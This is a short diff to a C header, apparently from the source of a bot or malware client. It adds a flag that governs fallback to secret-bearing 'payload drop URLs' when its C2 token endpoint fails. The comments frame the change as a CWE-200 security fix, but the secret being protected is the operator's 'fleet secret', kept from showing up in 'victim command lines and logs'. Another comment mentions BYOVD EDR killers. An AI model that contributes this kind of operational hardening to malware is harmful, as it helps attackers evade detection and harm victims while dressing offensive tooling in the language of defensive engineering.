@@ -204,6 +204,17 @@ typedef struct {
      * config_set key. */
     uint8_t plugin_enabled;
 
+    /* #314: Legacy secret-fallback gate for payload drop URLs. The
+     * one-time-token drop path (#190) is the only safe default; when the
+     * token endpoint fails, the bot FAILS CLOSED (drop skipped) unless
+     * allow_secret_fallback=1 explicitly re-enables the pre-#190
+     * ?secret= drop URL form. Off by default so a transient C2 outage
+     * can never silently re-expose the fleet secret in victim command
+     * lines and logs (CWE-200). Configured via allow_secret_fallback=
+     * in the config file or the `allow_secret_fallback` config_set
+     * key. */
+    uint8_t allow_secret_fallback;
+
     /* SECURITY FIX (#94): BYOVD defense-neutralization guard. BYOVD
      * (bring-your-own-vulnerable-driver) is the commodity successor to
      * kernel rootkits — ESET catalogued ~90 EDR killers, 54 abusing a
